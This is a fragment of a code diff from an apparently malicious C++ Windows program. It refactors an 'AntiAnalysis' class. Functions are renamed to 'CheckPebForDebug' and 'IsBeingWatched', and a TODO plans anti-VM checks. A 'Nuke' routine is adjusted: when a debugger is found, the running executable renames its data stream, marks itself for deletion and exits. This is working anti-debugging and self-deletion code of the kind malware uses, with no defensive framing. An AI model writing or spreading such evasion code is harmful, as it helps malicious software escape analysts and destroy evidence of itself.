@@ -4,7 +4,7 @@
 
 #define NEW_STREAM L":a"
 
-bool AntiAnalysis::Peb(API::APIResolver& resolver)
+bool AntiAnalysis::CheckPebForDebug(API::APIResolver& resolver)
 {
     PROCESS_BASIC_INFORMATION pbi;
 
@@ -34,15 +34,16 @@ bool AntiAnalysis::Peb(API::APIResolver& resolver)
     return false;
 }
 
-bool AntiAnalysis::PebCheck(API::APIResolver& resolver)
+bool AntiAnalysis::IsBeingWatched(API::APIResolver& resolver)
 {
-    if (Peb(resolver)) {
+    //TODO: add anti vm functionality
+
+    if (CheckPebForDebug(resolver)) {
         this->Nuke(resolver);
         ExitProcess(0);
     }
     return false;
 }
-
 
 int AntiAnalysis::Nuke(API::APIResolver& resolver)
 {
@@ -56,8 +57,8 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
 
     const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
 
-    SIZE_T StreamLength = wcslen(NewStream) * sizeof(wchar_t);
-    SIZE_T sRename      = sizeof(FILE_RENAME_INFO) + StreamLength;
+    size_t sStreamLength = wcslen(NewStream) * sizeof(wchar_t);
+    size_t sRename      = sizeof(FILE_RENAME_INFO) + sStreamLength;
 
     auto api = resolver.GetAPIAccess();
 
@@ -72,8 +73,8 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
     dispinfo.DeleteFile = TRUE; // Mark file for deletion
 
     // Setting the new data stream name buffer and size 
-    pRename->FileNameLength = StreamLength;
-    RtlCopyMemory(pRename->FileName, NewStream, StreamLength);
+    pRename->FileNameLength = sStreamLength;
+    RtlCopyMemory(pRename->FileName, NewStream, sStreamLength);
 
     // Get current file name
     if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) 
